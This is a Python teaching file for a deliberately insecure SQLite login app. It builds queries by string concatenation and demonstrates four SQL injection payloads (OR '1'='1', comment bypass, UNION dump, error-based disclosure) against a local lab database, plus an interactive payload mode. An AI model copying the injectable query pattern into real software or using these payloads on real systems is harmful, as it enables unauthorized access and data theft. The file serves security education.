"""
insecure_app.py
----------------
A deliberately vulnerable login demo used for teaching SQL injection.

This module shows what *not* to do: it builds SQL statements by joining
user input directly into query strings. That's unsafe and only used here
so you can experiment locally and learn how attacks work.

Run as a quick demo: `python insecure_app.py`.
"""

import sqlite3
import os
import sys

DB_PATH = os.path.join(os.path.dirname(__file__), "db", "lab.db")

BANNER = """
INSECURE LOGIN APP — educational demo
-------------------------------------
This is a local, intentionally-insecure example used for learning.
Do not reuse any of these patterns in production code.
"""

# ---------------------------------------------------------------------------
# Vulnerable helpers (for demo purposes)
# ---------------------------------------------------------------------------

def get_connection():
    if not os.path.exists(DB_PATH):
        print(f"[ERROR] Database not found at {DB_PATH}")
        print("        Run:  python db/seed.py   first.")
        sys.exit(1)
    return sqlite3.connect(DB_PATH)


def insecure_login(username: str, password: str) -> dict | None:
    """Insecure login routine.

    This function intentionally concatenates user input into a SQL
    statement so you can observe how injections are possible. Do not do
    this in real applications.
    """
    conn = get_connection()
    cur = conn.cursor()

    # This line demonstrates the vulnerability by interpolating input
    # directly into the SQL string. An attacker can inject SQL here.
    query = f"SELECT * FROM users WHERE username='{username}' AND password_hash='{password}'"

    print(f"\n  [SQL] {query}\n")

    try:
        cur.execute(query)
        row = cur.fetchone()
    except sqlite3.OperationalError as e:
        print(f"  [DB ERROR] {e}")
        conn.close()
        return None

    conn.close()
    if row:
        return {"id": row[0], "username": row[1], "role": row[3]}
    return None


def insecure_search_user(search_term: str):
    """Search helper that is intentionally unsafe.

    It builds the WHERE clause by concatenating the search term. A
    UNION-style payload can cause the database to return extra rows.
    """
    conn = get_connection()
    cur = conn.cursor()

    # ⚠️ VULNERABLE — string concatenation
    query = "SELECT id, username, role FROM users WHERE username = '" + search_term + "'"

    print(f"\n  [SQL] {query}\n")

    try:
        cur.execute(query)
        rows = cur.fetchall()
    except sqlite3.OperationalError as e:
        print(f"  [DB ERROR] {e}")
        conn.close()
        return []

    conn.close()
    return rows


# ---------------------------------------------------------------------------
# Demo attack scenarios — these show common injection techniques
# ---------------------------------------------------------------------------

def demo_attack_1_auth_bypass():
    """Show the classic `OR '1'='1` authentication bypass payload."""
    print("=" * 60)
    print("ATTACK 1: Classic Authentication Bypass  (OR '1'='1')")
    print("=" * 60)
    print("  Username: admin")
    print("  Password: ' OR '1'='1")
    print()
    print("  Injected query becomes:")
    print("    SELECT * FROM users WHERE username='admin' AND password_hash='' OR '1'='1'")
    print("  (Because '1'='1' is always true, the password check is bypassed.)\n")

    result = insecure_login("admin", "' OR '1'='1")
    if result:
        print(f"  [RESULT] ✅ Access GRANTED as: {result}")
    else:
        print("  [RESULT] ❌ Access denied (no match).")


def demo_attack_2_comment_bypass():
    """Use a SQL comment to truncate the WHERE clause and skip password checks."""
    print("\n" + "=" * 60)
    print("ATTACK 2: Comment-Out Password Check  (-- comment)")
    print("=" * 60)
    print("  Username: admin'--")
    print("  Password: anything")
    print()
    print("  Injected query becomes:")
    print("    SELECT * FROM users WHERE username='admin'--' AND password_hash='anything'")
    print("  ↳ Everything after -- is a comment → password field ignored!\n")

    result = insecure_login("admin'--", "anything")
    if result:
        print(f"  [RESULT] ✅ Access GRANTED as: {result}")
    else:
        print("  [RESULT] ❌ Access denied.")


def demo_attack_3_union_dump():
    """Use a UNION injection to demonstrate data leakage (dumping rows)."""
    print("\n" + "=" * 60)
    print("ATTACK 3: UNION-Based Data Dump")
    print("=" * 60)
    print("  Search term: ' UNION SELECT id, username, role FROM users--")
    print()
    print("  Injected query becomes:")
    print("    SELECT id, username, role FROM users WHERE username=''")
    print("    UNION SELECT id, username, role FROM users--")
    print("  ↳ Returns ALL users in the database!\n")

    payload = "' UNION SELECT id, username, role FROM users--"
    rows = insecure_search_user(payload)
    if rows:
        print(f"  [RESULT] ✅ Dumped {len(rows)} user record(s):")
        for r in rows:
            print(f"           id={r[0]}  username={r[1]!r:15} role={r[2]}")
    else:
        print("  [RESULT] No rows returned.")


def demo_attack_4_error_based():
    """Cause a syntax error to show how DB errors can leak info."""
    print("\n" + "=" * 60)
    print("ATTACK 4: Error-Based Information Disclosure")
    print("=" * 60)
    print("  Username: admin'")
    print("  (Single quote breaks the query syntax → DB error revealed)\n")

    result = insecure_login("admin'", "x")
    if result:
        print(f"  [RESULT] Access GRANTED: {result}")
    else:
        print("  [RESULT] ❌ Access denied (or DB error printed above).")
        print("           In a real app, that raw DB error leaks table/column names.")


# ---------------------------------------------------------------------------
# Interactive mode for manual experimentation
# ---------------------------------------------------------------------------

def interactive_mode():
    print("\n--- Interactive Login (try your own payloads) ---")
    print("Hints: username=admin  password=\" ' OR '1'='1 \"  or username=\"admin'--\"\n")

    username = input("  Username: ")
    password = input("  Password: ")

    result = insecure_login(username, password)
    if result:
        print(f"\n  [RESULT] LOGIN SUCCESS → {result}")
    else:
        print("\n  [RESULT] Login failed. Try another payload or run the demo.")


# ---------------------------------------------------------------------------
# MAIN
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    print(BANNER)

    mode = sys.argv[1] if len(sys.argv) > 1 else "demo"

    if mode == "demo":
        demo_attack_1_auth_bypass()
        demo_attack_2_comment_bypass()
        demo_attack_3_union_dump()
        demo_attack_4_error_based()
        print("\n" + "=" * 60)
        print("All 4 attacks demonstrated. Run 'python secure_app.py demo'")
        print("to see the same payloads FAIL against the secure version.")
        print("=" * 60)
    elif mode == "interactive":
        interactive_mode()
    else:
        print(f"Unknown mode '{mode}'. Use: demo | interactive")
